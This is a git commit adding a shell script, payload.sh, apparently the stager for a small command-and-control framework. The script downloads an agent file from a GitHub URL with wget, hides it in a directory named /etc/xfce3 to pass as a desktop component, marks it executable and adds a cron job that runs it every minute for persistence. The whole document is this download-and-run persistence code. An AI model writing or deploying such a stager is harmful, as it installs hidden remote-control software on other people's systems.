353b375cb78a1e2c876f70117768482da7053be9
Nicholas A <34774205+routpalm@users.noreply.github.com>
2022-03-04 23:46:53 -0500

    Add files via upload

---
+++ agents/payload.sh
@@ -0,0 +1,64 @@
+#!/bin/sh
+
+wget=/usr/bin/wget
+
+TARGET_DIR="/etc/"
+WGET_URL="https://github.com/routpalm/SUPERBASIC-C2/tree/main/agents/defaultagent"
+NEW_DIR="xfce3"
+FILE="defaultagent"
+SCRIPT_PATH="$0"
+
+if [ ! -x "$wget" ]; then
+  echo "ERROR: No wget." >&2
+  exit 1
+fi
+
+echo "Making new directory..."
+
+if ! cd "$TARGET_DIR"; then
+  echo "ERROR: can't access directory ($TARGET_DIR)" >&2
+  exit 1
+fi
+
+if ! mkdir "$NEW_DIR"; then
+  echo "ERROR: can't make directory ($NEW_DIR)" >&2
+  exit 1
+fi
+
+if ! cd "$NEW_DIR"; then
+  echo "ERROR: can't access directory ($NEW_DIR)" >&2
+  exit 1
+fi
+
+echo "Downloading script..."
+
+if ! wget ${WGET_URL}; then
+  echo "ERROR: can't download script" >&2
+  exit 1
+fi
+
+if ! chmod +x $FILE; then
+  echo "ERROR: can't make script executable" >&2
+  exit 1
+fi
+
+echo "Script downloaded... creating cronjob"
+
+if ! cd ~; then
+  echo "Can't access user home directory" >&2
+  exit 1
+fi
+
+if ! crontab -l > newcron; then
+  echo "Can't access crontab" >&2
+  exit 1
+fi
+echo "* * * * * ./etc/xfce3/defaultagent" >> newcron
+
+if ! crontab newcron; then
+  echo "Can't set crontab" >&2
+  exit 1
+fi
+rm newcron
+
+echo "Cronjob created."
